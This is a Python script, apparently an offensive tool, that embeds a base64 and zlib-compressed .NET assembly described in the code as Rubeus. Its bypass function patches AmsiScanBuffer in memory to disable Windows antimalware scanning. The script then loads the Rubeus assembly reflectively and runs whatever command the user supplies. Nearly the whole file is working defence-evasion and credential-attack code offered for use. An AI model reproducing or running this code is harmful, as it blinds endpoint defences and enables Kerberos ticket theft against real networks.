5joe5QiIFhUTfjOORHeG+IIcVcf5DRxiwWIurFt2KDtvi7iZg/wEp7xrFNjMGeUyrkMT/SXHwyEDF6Fp8KeYNGd2ewDeFFeW/Qv75nyoNMr++5l/Ee2tIdFDl+ykKet3iDEc+W7i3eEJNkL2AKw17DFzR6NmGWpxcQfy/mhX7/obNnNie+/VZPoNsTCHkCHia+LYxVFHUIfFzgAfCwSBv4RQeEwIstzXZ7guChCMqXi74ni8CschC8eAuxSgav1QGG4HQLi/dsEqmQASHSiJsNMGDSs+FuM1c9Xilnr+QL1XqxUp6cNSuXawbCeQhurQEdE7M5szpx6ujJy2VACiy7C/GUCg/kFh4sLABsNKAnU6kumMWZ2Xrkyx+NRGIDsRjAbgNuzScSsUJuMLc/lctF9yemU/n9qXxqev9QcnAgF48NDQyn8gDtBvij/bH+KMC4ATf0H89Ojpm5ucLlinlh35mCWUPWbr+U6E8i093rrKLRYq1ayi0cx2QPqxOxSiIISw2A4rlnvs3urD3j+Jt9AX9fBO1vrZ6E0xOjE7979udP//Abfzz+iX989ofPvGP2Jdbu0YNnc2ejZ2tnbSI5Wzn/4NnThVIhVyvY8/ur0+fhmy8opC+z+P9p79p5mwiC8JJYCCIiISpEtVpBg+RHjAsr2HEiQiRLiZIiuI2Wu7Vzyt7esXtnxR0/gYI/QUePEA0/gIKKCgnR0OQfADN7T8c2MhINgrF0533MN7Nzq525fegomUtfP5VTJ48C/fhcHHBPEd84gRai5kqZFf+4R+j2fJx/ilbsc6OEPL8N9yO4T5djFyekPScf6VJmXv90Qf33MLa9+ExIa7Uoaa224DqAkfkErrjbrzgw0Lf7jQ9tvbeVi++Is2KxinsvxankUgratXkD68P2YLTHGLpvd90Etvyu5Tq23gV3B8lS/JvQ68rLFcTA3f06jdxnkUJbpzgK0YJIowH5d6w9sigimz1JqEmu52UhSXbbZBEm0swSNdA2uQE8mfxd662Kz7QXei9YNId3jKsl/unFcyRcOm8mS+cg6ybULfxvMidaaPjrWSUCccAt4N+H/yPLiS0NoR06jUIiqDObR8mrNOpLDkQTct/asMBJnpZr4zmUf5ZbFGWizocpnpfqnLVXLa1729o5OcWB714YeZSfzSL7Nqx9p/kuW7ls4zZ4kitzPqy9mKdm+9XHL4R8K3X2izfvOr1zX9JxOsyzjVqDUaGcwPXUqMueHO9V24yaiCuXy0CJLpsIw3pb62vrax1ujPCfygkFCGW6LNZq0zinwuem6nuODkwwjKpO4G9y49fGG4z6XHlDYaJBWR6AUZqD9V2hIi+aTOmEP0YVOJguO5jshKH0HI4+s8bDkNUThEjHJuqrYbCkPs1EMnAa4cQaZKZpyNHiWQx6CvdIe2NPipEwS6I+YDlKGQd8ihOjxvtiLCSVeO0ybvpqHJwJzWjs7TiOMCBgyKURaaMsSH2ONpnq9SndO/XcCJDu1DOjbs0MuL9PHwj0bkKuPfwDWP/pr6Of0TU3Gg=="


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def to_clr_array(py_list):
    """
    Converts a Python list to a .NET string array.
    Args:
        py_list: The Python list to convert.
    Returns:
        A .NET string array.
    """
    arr = System.Array.CreateInstance(System.String, len(py_list))
    for i, item in enumerate(py_list):
        arr[i] = item
    return arr

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    rubeus_program_type = assembly.GetType("Rubeus.Program")

    # You don't need to create an instance of the class for a static method
    method = rubeus_program_type.GetMethod("MainString")

    # Convert your command to a .NET string array
    command_args = to_clr_array([command])

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, help='Command to execute (like "help" or "triage")')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()